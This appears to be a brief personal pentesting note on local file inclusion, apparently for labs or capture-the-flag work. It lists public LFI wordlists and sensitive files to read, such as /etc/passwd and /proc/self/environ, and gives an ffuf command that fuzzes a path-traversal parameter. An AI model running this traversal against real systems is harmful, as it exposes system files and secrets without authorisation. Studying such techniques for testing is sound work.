# wordlists

- /opt/repo/hacking-handbook
- https://github.com/drtychai/wordlists/blob/master/intruder/lfi.txt
- https://github.com/hussein98d/LFI-files/blob/master/list.txt
- https://github.com/rowbot1/lfi.list/blob/master/list.list
- https://github.com/carlospolop/Auto_Wordlists
- https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders

# files to check

- /proc/self/cmdline
- /proc/sched_debug
- /etc/passwd
- /proc/self/environ
- /proc/1/cmdline

# use ffuf to fuzz

```bash
ffuf -c -u "http://$rhost/lfi.php?read=../../../../../../../../../../FUZZ" -w wordlist -mc '200,204,301,302,307,401,405,403'
```
